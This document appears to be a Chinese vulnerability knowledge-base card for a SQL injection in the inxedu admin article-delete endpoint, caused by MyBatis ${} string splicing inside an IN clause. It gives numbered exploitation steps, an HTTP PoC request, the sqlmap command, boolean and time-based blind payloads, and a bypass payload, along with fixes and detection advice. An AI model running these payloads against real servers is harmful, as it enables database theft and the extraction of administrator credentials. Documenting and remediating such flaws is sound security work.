---
id: web-generic-sqli-inxedu-article-delete-mybatis-dollar-in
title: inxedu 后台文章批量删除 articleId 数组拼接进 MyBatis ${}：IN 子句 SQL 注入（sqlmap 布尔/报错/时间盲注）
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-inxedu-article-delete-dollar-in
aliases:
- 因酷 inxedu SQL注入
- ArticleMapper deleteArticleByIds ${value}
- admin/article/delete 注入
- articleId 数组拼接 IN 注入
- MyBatis dollar IN 子句注入
tags:
- sqli
- mybatis
- dollar-brace
- mysql
- java
- inxedu
- blind
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V555
  verified_at: '2026-11-12T00:18:58+08:00'
  notes: 已通读原文并逐张核读20张图（缺失的03/04/05/06/08/19转1200px JPEG，无失败）：图01/03 ArticleMapper.xml 的 deleteArticleByIds 与 deleteArticleContentByArticleIds 均为 DELETE ... ARTICLE_ID IN (${value})；图04 ArticleDao 参数为 String articleIds；图05 ServiceImpl 循环以逗号拼接 ids 后调两个 DAO；图06 AdminArticleController.delete 用 request.getParameterValues("articleId")；图08 POST /admin/article/delete 携带 Cookie inxedulogin_sys_user_=inxedulogin_sys_user_1、articleId=2；图09 sqlmap 实测布尔盲注 articleId=(SELECT (CASE WHEN (9902=9902) THEN 23 ELSE (SELECT 6950 UNION SELECT 3312) END))、报错注入 2*(IF(...))、时间盲注 AND (SELECT 6367 FROM (SELECT(SLEEP(5)))PbvL)，并识别 MySQL >= 5.5，与卡内逐字一致。dedup 20候选全 new（tmall/dahua ORDER BY、DocSys LIKE、CordysCRM FIELD 等均为其它产品/语句位置），无同链；dup-scan 无配对。未验证点：卡内利用步骤第2步（articleId=2) 观察报错）为通用验证方法，原文未展示该步；PoC 未本机复跑。原文未标版本，不设 affected_versions；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

inxedu 后台文章管理把前端传入的 `articleId` 数组在 Service 层用逗号拼成一个字符串，再原样塞进 MyBatis `ArticleMapper.xml` 的 `DELETE FROM EDU_ARTICLE WHERE ARTICLE_ID IN (${value})`；`${}` 不做预编译，攻击者控制数组元素即可闭合 `IN (...)` 注入任意 SQL 表达式，sqlmap 对 POST 参数 `articleId` 确认了布尔盲注、报错注入与时间盲注，可盲注拖库。

## 原理

- **数据流**：`AdminArticleController.delete()` 用 `request.getParameterValues("articleId")` 取数组 → `ArticleServiceImpl.deleteArticleByIds(String[] articleIds)` 循环把每个元素用 `,` 拼成 `ids` 字符串 → `ArticleDao.deleteArticleByIds(ids)` / `deleteArticleContentByArticleIds(ids)` → Mapper XML 中 `IN (${value})`。
- **`${}` 与 `#{}` 的区别**：MyBatis 的 `#{}` 会生成 `?` 占位符并绑定参数；`${}` 是纯文本替换，直接把字符串拼进 SQL。放在 `IN (...)` 里时，攻击者提供的元素不是单个值而是 SQL 片段，原本的 `IN (2)` 可以被扩展成任意表达式（如 `IN ((SELECT ...))` 或 `IN (1) AND ...`）。
- **数组拼接放大注入面**：即使单个参数按值处理，只要某个元素包含 SQL 元字符就会被原样带入；逗号拼接本身也把多个输入合并为一整段 SQL 文本。
- **验证**：对 `POST /admin/article/delete` 的 `articleId` 参数跑 sqlmap，识别为 MySQL >= 5.5，布尔盲注 payload `(SELECT (CASE WHEN (9902=9902) THEN 23 ELSE (SELECT 6950 UNION SELECT 3312) END))`、报错注入 `SELECT 2*(IF((SELECT * FROM ...), ...))`、时间盲注 `AND (SELECT 6367 FROM (SELECT(SLEEP(5)))PbvL)` 均被接受。
- **影响**：该 SQL 位于 DELETE 语句，常规 union 不可用，但布尔/报错/时间盲注可读出全库数据；结合后台会话可进一步读取管理员凭据表。原文环境为 inxedu 开源版（Java + MyBatis + MySQL）。

## 触发条件

- 目标为 inxedu（因酷在线教育）开源版，存在后台文章列表/批量删除功能。
- 攻击者持有可访问 `/admin/article/delete` 的后台会话（原文使用管理员 Cookie `inxedulogin_sys_user_=inxedulogin_sys_user_1`）。
- `ArticleMapper.xml` 的 `deleteArticleByIds` / `deleteArticleContentByArticleIds` 使用 `${value}`，且 Service 层用逗号拼接数组。
- MyBatis 未开启会对 `${}` 做转义的全局插件；WAF 未拦截。

## 利用步骤

1. 登录后台，进入文章列表，勾选文章点删除，抓 `POST /admin/article/delete` 请求，确认参数为 `articleId=<id>`。
2. 把 `articleId` 改为 `articleId=2` 正常删除；改为 `articleId=2)` 观察报错，确认拼接点在 `IN (...)` 内。
3. 用 sqlmap 指定该参数（POST）跑 `--technique=BEST`：`python sqlmap.py -r req.txt -p articleId --batch`，或手工布尔/时间 payload 验证。
4. 按 sqlmap 识别结果用布尔/报错/时间盲注逐层提取库名、表名、管理员凭据。
5. 若目标过滤了 `IN` 内表达式，可用 `articleId=1) AND (SELECT ...)-- -` 或子查询形式绕过。

## PoC

```http
POST /admin/article/delete HTTP/1.1
Host: 127.0.0.1:81
Cookie: JSESSIONID=<...>; inxedulogin_sys_user_=inxedulogin_sys_user_1
Content-Type: application/x-www-form-urlencoded

articleId=2
```

注入验证（sqlmap 确认的 payload，原文自动加在参数值后）：

```text
articleId=(SELECT (CASE WHEN (9902=9902) THEN 23 ELSE (SELECT 6950 UNION SELECT 3312) END))
articleId=23 AND (SELECT 6367 FROM (SELECT(SLEEP(5)))PbvL)
```

对应 SQL：

```sql
DELETE FROM EDU_ARTICLE WHERE EDU_ARTICLE.ARTICLE_ID IN ((SELECT (CASE WHEN (9902=9902) THEN 23 ELSE (SELECT 6950 UNION SELECT 3312) END)))
```

## 变体与关联

- 变体：同 Controller 的 `deleteArticleContentByArticleIds` 使用同一 `ids` 字符串，两个 Mapper 都可注入；同项目其它 Mapper 若也用 `${}` 放数组/排序/表名，可批量排查。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（MyBatis `${}` 五类拼接点与通用审计方法）。
- 边界：后台接口需要登录；DELETE 语句不支持 union 直接回显，需走盲注/报错；注入的表达式必须语法上适配 `IN (...)` 的上下文。

## 检测与防御

- 修复：Mapper 改用 `#{}` + `<foreach>` 生成占位符（`IN <foreach collection="ids" item="id" open="(" separator="," close=")">#{id}</foreach>`）；Service 不要拼接 SQL 片段。
- 加固：后台管理接口做角色校验与 CSRF 防护；数据库账号最小权限；WAF 拦截 `IN (` 内出现子查询/CASE/SLEEP 的模式。
- 检测：审计所有 `${}` 拼接点，特别是 `IN (...)`、`ORDER BY`、表名位置；数据库慢查询与错误日志中出现 DELETE 语句附带大量 CASE/SLEEP 子查询。
